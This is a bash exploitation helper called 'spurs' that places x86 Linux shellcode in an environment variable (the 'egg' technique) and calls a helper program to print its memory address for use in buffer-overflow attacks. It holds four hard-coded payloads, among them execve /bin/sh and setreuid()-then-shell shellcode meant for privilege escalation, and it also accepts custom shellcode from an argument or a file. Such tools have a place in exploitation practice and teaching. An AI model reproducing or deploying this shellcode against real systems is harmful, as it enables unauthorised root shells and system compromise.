#! /bin/bash
env_name="EGGSHELL"
is_option=0
get_addr=1
help()
{
	echo "spurs [OPTIONS]"
	echo "n arg     arg shellcode number"
	echo "-1) simple shellcode"
	echo "-2) simple shellcode containing exit()"
	echo "-3) shellcode containing setreuid() and exit()"
	echo "-4) execve /bin/sh shellcode"

	echo "d arg     arg is your custom shellcode"
        echo "f arg     arg read file and put env"
        echo "s arg     arg shellcode name(default:EGGSHELL)"	
}

setenvbynumber ()
{
	local shell_code_num=$1

	case $shell_code_num in
		1)
			export $env_name=$(python -c 'print ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80")')				 
			;;
		2)
			export $env_name=$(python -c 'print ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80")')
			;;
		3)      
			export $env_name=$(python -c 'print("\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80")')
			;;
		4)
			export $env_name=$(python -c 'print("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")')
			;;
	       	*)
			help
			is_option=1
			get_addr=0
			;;
		 esac
}
setenvbydirect ()
{
	export $env_name=$(python -c 'print("'$1'")')
}

setenvbyfile()
{
	if [-f "$1"];then
		file_content=$(<$1)
		export $env_name=$(python -c 'print("'$file_content'")')
	else
		echo "File does not exist"
		get_addr=0
	fi
}

while getopts "s:n:d:f:h" opt
do
	case $opt in
		s) env_name=$OPTARG
		;;
	        n) 
		   if [ $is_option -eq 0 ];then
			   setenvbynumber $OPTARG
			   is_option=1
		   fi
		;;
	        d) 
		   if [ $is_option -eq 0 ];then
			setenvbydirect $OPTARG
			is_option=1
		   fi
		;;
	        f) 
		   if [ $is_option -eq 0 ];then
			setenvbyfile $OPTARG
			is_option=1
	           fi
		;;
		h)
			help
			is_option=1
			get_addr=0
			;;
		?)
			help
			is_option=1
			get_addr=0
			;;
	esac
done

if [ $is_option -eq 0 ];then
	setenvbynumber 1
fi

if [ $get_addr -ne 0 ];then
	./get_env_addr $env_name
fi
exit
